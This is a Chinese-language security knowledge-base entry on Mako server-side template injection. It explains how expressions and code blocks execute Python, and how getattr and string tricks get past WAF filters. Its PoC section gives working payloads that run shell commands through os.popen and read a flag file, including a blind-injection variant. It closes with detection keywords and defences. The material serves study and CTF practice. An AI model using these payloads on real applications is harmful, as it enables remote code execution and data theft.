---
id: web-python-ssti-mako-context-write-getattr-bypass
title: Mako SSTI：${} 与 <% context.write %> 代码块执行及 getattr 绕过过滤
type: scenario
domain: web
path: web/python/ssti
technique: mako-ssti
tags:
- ssti
- python
- mako
- context-write
- getattr
- waf-bypass
- blind-injection
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V1
  verified_at: '2026-11-04T21:53:21+08:00'
  notes: 已对照原文与 6 张图片核对；未执行文中 PoC
url: /docs/web/python/ssti/web-python-ssti-mako-context-write-getattr-bypass/
draft: false
kb_aliases:
- Mako SSTI
- Mako 模板注入
- context.write Mako
- Mako 代码块 RCE
- getattr 绕过 Mako
- Mako 盲注
---

## 一句话结论

Mako 的 `${expr}` 直接执行 Python 表达式，`<% ... %>` 可执行任意 Python 代码块；当 `$`/`${}` 被 WAF 过滤时用代码块加 `context.write(...)` 回显，当 `.` 或关键字被过滤时用 `getattr`/字符串拼接/通配符绕过，仍可读文件或执行命令。

## 原理

Mako 是 Python 模板引擎，表达式 `${...}` 在渲染时按 Python 语义求值，默认无沙箱；`<% ... %>` 是代码块，可写多行 Python。与 Bottle 不同，Mako 不支持 `% 单行 Python 代码`，任意 Python 逻辑应放在 `<% %>` 中；`% if`/`% for` 等控制结构仍可用。

回显方式：

- `${expr}` 直接把结果写入输出；
- 代码块中可用 `context.write(value)` 写入当前输出缓冲；
- 无回显时可用 `% if` 控制结构做布尔盲注，或抛异常/发起 DNS/HTTP 请求。

## 触发条件

- 应用使用 `mako.template.Template(user_input).render()` 或把用户输入拼进模板文件；
- 目标存在可读文件/可执行命令权限；
- WAF 可能过滤 `${`、`.`、`flag` 等，需要按过滤情况换写法。

## 利用步骤

1. 用 `${7*7}` 确认表达式求值；若原样回显再试 `<% ... %>` 或 `%` 控制结构。
2. 若 `${}` 被过滤，改用 `<% context.write(__import__('os').popen('id').read()) %>`。
3. 若 `.` 和 `flag` 被过滤，把所有属性访问改为 `getattr(obj,'attr')`，文件名用 `fla*` 或字符串拼接。
4. 无回显时用 `% if` 条件 + 页面差异做盲注，或用 DNS/HTTP 外带。
5. 确认后执行命令或读取文件。

## PoC

基础 RCE：

```python
${__import__('os').popen('whoami').read()}
```

`${}` 被过滤时用代码块 + `context.write`：

```python
<% context.write(__import__('os').popen('whoami').read()) %>
```

`.` 与 `flag` 被过滤（LitCTF 风格）：

```python
<%getattr(context,'write')(getattr(getattr(__import__('os'),'popen')('cat /fla*'),'read')())%>
```

盲注（按首位字符判断）：

```python
% if getattr(getattr(open("/"+"f"+"l"+"a"+"g"), 'read')(), '__getitem__')(0) in 'f':
True_Flag
% endif
```

## 变体与关联

- 回显变体：`context.write`、`${}`、异常报错、DNS/HTTP 外带。
- 过滤绕过：`getattr` 替代点号、`"fla"+"g"` 拼接、`fla*` 通配、`__import__` 拆分。
- 控制结构：`% if`/`% for` 可做布尔盲注；Mako 的 `%` 行只支持控制语句，不支持任意单行 Python。
- 关联：Bottle SimpleTemplate SSTI、Jinja2 SSTI；Mako 常与 Flask 混用，注意 `render_template_string` 与 `Template` 的区别。

## 检测与防御

- 检测：请求/模板中出现 `${`、`<%`、`context.write`、`__import__`、`popen`、`getattr`；渲染错误含 `MakoException`、`SyntaxException`。
- 防御：不要渲染用户可控模板；禁止把用户输入作为模板源码；对模板目录做白名单；使用沙箱/受限环境；过滤前先做规范化并检查 `getattr` 等替代调用。
- 注意：只过滤 `${` 不够，`<% %>` 代码块同样能执行 Python。
